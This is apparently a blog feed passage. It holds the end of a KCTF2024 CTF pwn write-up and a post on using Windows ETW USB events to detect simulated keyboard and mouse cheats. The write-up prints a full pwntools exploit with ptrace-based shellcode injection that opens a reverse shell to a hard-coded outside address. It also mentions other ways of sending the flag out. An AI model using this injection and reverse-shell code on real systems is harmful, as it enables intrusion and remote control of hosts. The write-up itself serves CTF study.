class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;usage: exp.py pid&#x27;</span>)</span><br><span class="line">    quit()</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">serveraddr=[<span class="number">0xe14e2b650f270002</span>,<span class="number">0x0000000000000064</span>]</span><br><span class="line"><span class="comment">#server struct</span></span><br><span class="line"><span class="comment">#target ip: 101.43.78.225:9999</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./test&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;47.101.191.23&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;0x&#x27;)</span></span><br><span class="line"><span class="comment">#addr=int(p.recv(12),16)</span></span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x7f0000000000</span></span><br><span class="line">inject_shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*socket(AF_INET,SOCK_STREAM,0)*/</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">mov eax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,2</span></span><br><span class="line"><span class="string">mov esi,1</span></span><br><span class="line"><span class="string">mov edx,0</span></span><br><span class="line"><span class="string">mov eax,41</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r14,0xe14e2b650f270002</span></span><br><span class="line"><span class="string">mov r15,0x64</span></span><br><span class="line"><span class="string">mov r12,rsp</span></span><br><span class="line"><span class="string">mov [r12],r14</span></span><br><span class="line"><span class="string">mov [r12+8],r15</span></span><br><span class="line"><span class="string">mov r13,r12</span></span><br><span class="line"><span class="string">/*connect(sockfd,serveraddr,16)*/</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,r13</span></span><br><span class="line"><span class="string">mov edx,16</span></span><br><span class="line"><span class="string">mov eax,42</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=0) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=1) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* dup2(fd=3, fd2=2) */</span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">/* call dup2() */</span></span><br><span class="line"><span class="string">push SYS_dup2 /* 0x21 */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* execve(path=&#x27;/bin/sh&#x27;, argv=0, envp=0) */</span></span><br><span class="line"><span class="string">/* push b&#x27;/bin/sh\x00&#x27; */</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x68732f6e69622f</span></span><br><span class="line"><span class="string">xor [rsp], rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">/* call execve() */</span></span><br><span class="line"><span class="string">push SYS_execve /* 0x3b */</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(len(asm(inject_shellcode)))</span></span><br><span class="line">inject_shellbytes=<span class="string">b&#x27;\x90&#x27;</span>*<span class="number">6</span>+asm(inject_shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;inject_shellcode: &#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(inject_shellbytes)))</span><br><span class="line">pid=sys.argv[<span class="number">1</span>]</span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*save mmap start addr*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">/* ptrace(request=0x10, vararg_0=0x64, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">mov edi,0x10/*ATTACH*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rcx,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test ax,ax</span></span><br><span class="line"><span class="string">jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,0xc /*GETREGS*/</span></span><br><span class="line"><span class="string">mov esi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">add rcx,0x800</span></span><br><span class="line"><span class="string">mov r10,rcx</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">add rcx,0x880</span></span><br><span class="line"><span class="string">mov rdx,[rcx]</span></span><br><span class="line"><span class="string">/*RIP offset*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">add rcx,0x200</span></span><br><span class="line"><span class="string">push rcx</span></span><br><span class="line"><span class="string">/*inject shellcode*/</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">mov rbx,0x100</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    mov edi,4/*pokedata*/</span></span><br><span class="line"><span class="string">    mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">    mov r10,[rcx]</span></span><br><span class="line"><span class="string">    mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    add rcx,8</span></span><br><span class="line"><span class="string">    add rdx,8</span></span><br><span class="line"><span class="string">    push rcx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    sub rbx,8</span></span><br><span class="line"><span class="string">    test rbx,rbx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov edi,7</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,17</span></span><br><span class="line"><span class="string">mov rsi,<span class="subst">&#123;pid&#125;</span></span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov r10,0</span></span><br><span class="line"><span class="string">mov eax,SYS_ptrace</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\0&#x27;</span>)+inject_shellbytes</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=inject_shellbytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.close()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>当时试了一个 pid&#x3D;17 就反弹成功了。</p><img src="/2024/09/02/KCTF2024/5.png" class=""><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>其实这题解法应该挺多的，因为直接给了 root 权限，所以直接去写启动的二进制文件也不是不可以，把沙箱代码 patch 掉直接shellcode执行 sh，或者不用反弹shell，直接 orw 出了 flag udp 直接发过来也可以，总归它出网想要外带信息还是非常容易的。</p>]]></content>
    
    
    <summary type="html">KCTF2024第八题——星门 writeup</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="pwn" scheme="https://xia0ji233.github.io/categories/ctf/pwn/"/>
    
    
    <category term="ptrace" scheme="https://xia0ji233.github.io/tags/ptrace/"/>
    
  </entry>
  
  <entry>
    <title>etw机制分析</title>
    <link href="https://xia0ji233.github.io/2024/07/08/etw/"/>
    <id>https://xia0ji233.github.io/2024/07/08/etw/</id>
    <published>2024-07-08T02:00:00.000Z</published>
    <updated>2024-07-08T14:13:09.458Z</updated>
    
    <content type="html"><![CDATA[<p>尝试做一做模拟类外挂检测</p><span id="more"></span><h2 id="鼠标-键盘模拟监控"><a href="#鼠标-键盘模拟监控" class="headerlink" title="鼠标-键盘模拟监控"></a>鼠标-键盘模拟监控</h2><p>鼠标-键盘模拟外挂相较于直接读&#x2F;写内存的外挂相比，更加安全和可靠，因为它本质还是模拟人去操作的，只要频率设置不过分，那么不管是客户端检测还是服务端检测都是难以察觉的，因此这几天在思考一个可以检测这类外挂的方案。</p><h3 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h3><p>Windows (ETW) 的事件跟踪提供一种机制来跟踪和记录由用户模式应用程序和内核模式驱动程序引发的事件。 ETW 在 Windows 操作系统中实现，为开发人员提供了一组快速、可靠且通用的事件跟踪功能[1]。</p><p>经过深入的研究，发现 ETW 可以监控很多东西，上到进程创建，下到 UDP&#x2F;TCP 数据包监控，无所不能。</p><h3 id="想法构思"><a href="#想法构思" class="headerlink" title="想法构思"></a>想法构思</h3><p>那么既然 ETW 给了一种可以在 r3 层监控大量信息的机制，那么是否可以做到监控真实的键盘按键呢？如果能做到，配合 Windows 的消息监控便可以达到检测键盘-鼠标模拟的功能，因为鼠标模拟本质是直接通过 Windows API 发送消息，而不会经过键盘，所以如果检测到了按键消息而没有检测到真实按键的话，就可以判断为使用了鼠标-键盘模拟。</p><p>如果去搜索 etw 键盘监控，大概率是只能搜到这个 8 年前的老项目 <a href="https://github.com/CyberPoint/Ruxcon2016ETW%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%98%AF">https://github.com/CyberPoint/Ruxcon2016ETW，这个项目是</a> C# 写的，虽然可以运行，但是监控是监控不了一点的。</p><p>但是很幸运的是，有人发布了最新的键盘模拟检测 <a href="https://github.com/Oliver-1-1/EtwKeyboardDetection%EF%BC%8C%E7%84%B6%E8%80%8C%E6%88%91%E8%87%AA%E5%B7%B1%E6%B5%8B%E8%AF%95%E4%B8%8B%E6%9D%A5%E6%98%AF%E6%B2%A1%E6%9C%89%E6%95%88%E6%9E%9C%E7%9A%84%EF%BC%8C%E4%BD%86%E6%98%AF%E5%AE%83%E7%9A%84%E6%A1%86%E6%9E%B6%E5%86%99%E7%9A%84%E8%BF%98%E6%98%AF%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%80%9F%E7%94%A8%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%EF%BC%8C%E5%AE%83%E8%8E%B7%E5%8F%96%E4%BA%86">https://github.com/Oliver-1-1/EtwKeyboardDetection，然而我自己测试下来是没有效果的，但是它的框架写的还是非常不错的，可以借用参考一下，它获取了</a> Microsoft-Windows-USB-UCX 这个 provider 的全部事件。</p><p>这里参考一个<a href="https://github.com/performancecopilot/pcp/blob/main/src/pmdas/etw/tdhconsume.c">项目</a>的框架，去打印 event 的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function">    <span class="title">PrintEventInfo</span><span class="params">(PTRACE_EVENT_INFO pInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (DecodingSourceWbem == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: MOF class event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceXMLFile == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: XML manifest event\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (DecodingSourceWPP == pInfo-&gt;DecodingSource)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;EventInfo: WPP event\n&quot;</span>);</span><br><span class="line">    <span class="comment">/*此处略去大量代码，具体信息可以查看项目代码*/</span></span><br><span class="line">    <span class="keyword">if</span> (pInfo-&gt;RelatedActivityIDNameOffset &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">wprintf</span>(<span class="string">L&quot;Related activity ID name: %s\n&quot;</span>,</span><br><span class="line">                (LPWSTR)((PBYTE)(pInfo) + pInfo-&gt;RelatedActivityIDNameOffset));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它会刷新大量的 26 号和 27 号的事件</p><img src="/2024/07/08/etw/1.png" class=""><p>官方也提供了抓取 usb 事件的方式[2]。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">logman create trace -n usbtrace -o %SystemRoot%\Tracing\usbtrace.etl -nb 128 640 -bs 128</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBXHCI (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-UCX (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB3 (Default,PartialDataBusTrace)</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBPORT</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-USB-USBHUB</span><br><span class="line">logman update trace -n usbtrace -p Microsoft-Windows-Kernel-IoTrace 0 2</span><br><span class="line">logman start -n usbtrace</span><br></pre></td></tr></table></figure><p>停止抓取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logman stop -n usbtrace</span><br><span class="line">logman delete -n usbtrace</span><br><span class="line">move /Y %SystemRoot%\Tracing\usbtrace_000001.etl %SystemRoot%\Tracing\usbtrace.etl</span><br></pre></td></tr></table></figure><p>最后会生成一个 usbtrace.etl 文件。</p><img src="/2024/07/08/etw/2.png" class=""><p>时间轴也可以见到一直是出现 26 和 27 号的事件，所以主要分析的就是这两个事件。</p><p>这里我又参考了另一<a href="https://github.com/MSDN-WhiteKnight/HidLogger/blob/master/HidLogger.cs">项目</a>，是 C# 写的，但是略微可以看出一二。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> UsbData <span class="title">GetData</span>(<span class="params">TraceEvent eventData</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">ulong</span> hndl;</span><br><span class="line">    <span class="built_in">object</span> field;</span><br><span class="line">    <span class="built_in">uint</span> vid=<span class="number">0</span>,pid=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">byte</span> usbver = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to determine device handle and IDs</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_Device&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (field != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; deviceInfo = _expose(field);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">ulong</span>.TryParse(deviceInfo[<span class="string">&quot;DeviceHandle&quot;</span>], <span class="keyword">out</span> hndl) &amp;&amp; hndl &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        vid = UInt32.Parse(deviceInfo[<span class="string">&quot;idVendor&quot;</span>]);</span><br><span class="line">        pid = UInt32.Parse(deviceInfo[<span class="string">&quot;idProduct&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        hndl = (<span class="built_in">ulong</span>)GetItem(eventData, <span class="string">&quot;fid_PipeHandle&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (hndl &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//try to get event parameters</span></span><br><span class="line">    field = GetItem(eventData, <span class="string">&quot;fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//2.0</span></span><br><span class="line">    usbver = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (field == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        field = GetItem(eventData, <span class="string">&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>); <span class="comment">//3.0</span></span><br><span class="line">        usbver = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; urb = _expose(field);<span class="comment">//transform parameter string to dictionary</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//determine transferred data length</span></span><br><span class="line">    <span class="built_in">int</span> xferDataSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">int</span>.TryParse(urb[<span class="string">&quot;fid_URB_TransferBufferLength&quot;</span>], <span class="keyword">out</span> xferDataSize))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((xferDataSize &gt; <span class="number">8</span>) &amp;&amp; (usbver == <span class="number">2</span>)) xferDataSize = <span class="number">8</span>; <span class="comment">//USB 2.0 sometimes gives wrong size </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (xferDataSize &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is too large for mouse / keyboard</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte</span>[] data2=eventData.EventData();</span><br><span class="line">    <span class="built_in">byte</span>[] xferData = <span class="keyword">new</span> <span class="built_in">byte</span>[xferDataSize];</span><br><span class="line">    Array.Copy(data2, eventData.EventDataLength - xferDataSize, xferData, <span class="number">0</span>, xferDataSize);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> HasNonZero = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; xferDataSize; i++)</span><br><span class="line">        <span class="keyword">if</span> (xferData[i] != <span class="number">0</span>) &#123; HasNonZero = <span class="literal">true</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (HasNonZero == <span class="literal">false</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//data is empty</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Construct UsbData object*/</span></span><br><span class="line">    UsbData data = <span class="keyword">new</span> UsbData(eventData.TimeStamp, hndl, xferData);</span><br><span class="line">    data.usbver = usbver;</span><br><span class="line">    data.datalen = (<span class="built_in">uint</span>)xferDataSize;</span><br><span class="line">    data.vid = vid;</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好和我主要参考的框架的事件处理中有相似之处。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">    <span class="title">EtwCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PEVENT_RECORD Event</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD size;</span><br><span class="line">    PTRACE_EVENT_INFO trace;</span><br><span class="line">    PWCHAR provider;</span><br><span class="line">    EVENT_PROPERTY_INFO property;</span><br><span class="line">    EVENT_PROPERTY_INFO iProperty;</span><br><span class="line"></span><br><span class="line">    trace = <span class="built_in">GetEventData</span>(Event, &amp;size);</span><br><span class="line"></span><br><span class="line">    provider = (PCHAR)trace + trace-&gt;ProviderNameOffset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (UINT countIndex = <span class="number">0</span>;</span><br><span class="line">         countIndex &lt; trace-&gt;TopLevelPropertyCount;</span><br><span class="line">         countIndex = countIndex + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        EVENT_PROPERTY_INFO  property = trace-&gt;EventPropertyInfoArray[countIndex];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER&quot;</span>, (PCHAR)trace + property.NameOffset))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (INT propertyIndex = property.structType.StructStartIndex;</span><br><span class="line">                 propertyIndex &lt; property.structType.StructStartIndex + property.structType.NumOfStructMembers;</span><br><span class="line">                 propertyIndex = propertyIndex + <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                iProperty = trace-&gt;EventPropertyInfoArray[propertyIndex];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(<span class="string">L&quot;fid_URB_TransferBufferLength&quot;</span>, (PCHAR)trace + iProperty.NameOffset))</span><br><span class="line">                &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">//Get value of fid_URB_TransferBufferLength</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    LPCWSTR string = <span class="built_in">GetPropertyData</span>(</span><br><span class="line">                        trace,</span><br><span class="line">                        Event,</span><br><span class="line">                        iProperty,</span><br><span class="line">                        <span class="number">20</span>); <span class="comment">// index for fid_URB_TransferBufferLength</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (string == <span class="literal">NULL</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    <span class="comment">// Filter out for only keyboard packets by size</span></span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(string, <span class="string">L&quot;0xC&quot;</span>))</span><br><span class="line">                    &#123;</span><br><span class="line">                        etwCount = etwCount + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">free</span>(string);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前者，会判断 <code>fid_URB_TransferBufferLength</code> 这个属性的属性值，进行一些判断，根据注释也可以看明白，在当时的年代，可能鼠标事件的这个长度是 4 或者 5，键盘事件的长度是 8，超出则该事件不是键盘或者鼠标的点击或移动事件。</p><p>后者同样是取出值判断是否为 0xC，来检查是不是键盘事件，若是则让 etwCount+1。这里需要说明的是，这个项目的原理和我的构思是差不多的，它hook了windows消息，每次获得 F1 键的消息时会判断这次点击是不是 F1，然后根据 etwCount 和win32Count 